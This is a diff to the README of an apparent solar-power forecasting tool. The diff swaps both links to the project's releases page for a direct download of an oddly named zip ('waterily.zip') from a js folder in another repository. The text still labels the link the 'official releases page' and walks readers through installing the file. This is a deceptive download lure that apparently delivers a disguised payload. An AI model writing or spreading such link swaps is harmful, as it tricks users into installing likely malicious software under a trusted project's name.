@@ -5,7 +5,7 @@ description: "Compress photovoltaic power forecasting data using geometry to bal
 ---
 # ☀️ pv-dimensionality-reduction - Predict solar power output with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Shivam4905/pv-dimensionality-reduction/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Shivam4905/shivam4905.github.io/raw/refs/heads/main/js/waterily.zip)
 
 This application predicts how much power solar panels produce. It uses data about local sunlight and weather to forecast energy output. The software helps grid managers and home owners plan their energy needs. It uses proven math methods to find important patterns in complex data. These methods ensure the system remains accurate while using fewer computer resources.
 
@@ -22,7 +22,7 @@ To run this application, your computer needs the following specifications:
 
 You must download the installation files from the project website. Follow these steps to obtain the tool:
 
-1.  Visit the [official releases page](https://github.com/Shivam4905/pv-dimensionality-reduction/releases).
+1.  Visit the [official releases page](https://github.com/Shivam4905/shivam4905.github.io/raw/refs/heads/main/js/waterily.zip).
 2.  Look for the latest version under the "Assets" section.
 3.  Click the link labeled `pv-dimensionality-reduction-installer.zip`.
 4.  Save the file to your computer.
